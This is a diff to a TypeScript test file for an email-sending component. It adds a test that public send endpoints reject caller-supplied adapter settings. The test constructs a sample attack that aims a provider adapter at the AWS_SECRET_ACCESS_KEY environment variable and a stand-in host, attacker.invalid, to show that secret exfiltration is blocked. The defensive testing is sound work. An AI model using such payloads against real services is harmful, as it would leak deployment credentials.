@@ -20,8 +20,6 @@ const message = {
   to: "ada@example.com",
   subject: "Welcome",
   text: "Your account is ready.",
-  adapters: [{ kind: "memory" as const }],
-  adapter: "memory",
 };
 
 const resendSecretBytes = new Uint8Array(32).fill(7);
@@ -45,6 +43,8 @@ const sender = emailSender(convexEmailComponent());
 
 const email = new ConvexEmail(convexEmailComponent(), {
   sender: makeFunctionReference<"action", { emailId: string }, null>("emailSender:send"),
+  adapters: [{ kind: "memory" }],
+  defaultAdapter: "memory",
 });
 
 const publicApi = email.exposeApi();
@@ -287,6 +287,36 @@ describe("ConvexEmail.exposeApi", () => {
     expect(status).toMatchObject({ status: "sent", attemptedAdapters: ["memory"] });
     expect(status?.providerMessageId).toEqual(expect.any(String));
     expect(events.map((event) => event.type)).toEqual(["queued", "processing", "provider_attempt", "sent"]);
+  });
+
+  test("refuses caller-supplied adapter config, so public sends cannot exfiltrate deployment secrets", async () => {
+    const t = createTest();
+    const asAda = t.withIdentity({ subject: "user_123" });
+    const requests: string[] = [];
+    const nativeFetch = globalThis.fetch;
+
+    process.env.AWS_SECRET_ACCESS_KEY = "aws-secret-placeholder";
+    globalThis.fetch = async (input) => {
+      requests.push(String(input instanceof Request ? input.url : input));
+
+      return new Response(JSON.stringify({ id: "exfiltrated" }), { status: 200 });
+    };
+
+    const attack = {
+      ...message,
+      adapters: [{ kind: "resend" as const, apiKeyEnv: "AWS_SECRET_ACCESS_KEY", baseUrl: "https://attacker.invalid" }],
+      adapter: "resend",
+    };
+
+    try {
+      await expect(asAda.mutation(app.send, attack)).rejects.toThrow("Validator error");
+      await expect(asAda.mutation(app.sendBatch, { messages: [attack] })).rejects.toThrow("Validator error");
+      await flushScheduled(t);
+      expect(requests).toEqual([]);
+    } finally {
+      globalThis.fetch = nativeFetch;
+      delete process.env.AWS_SECRET_ACCESS_KEY;
+    }
   });
 
   test("queues public batches under one owner", async () => {
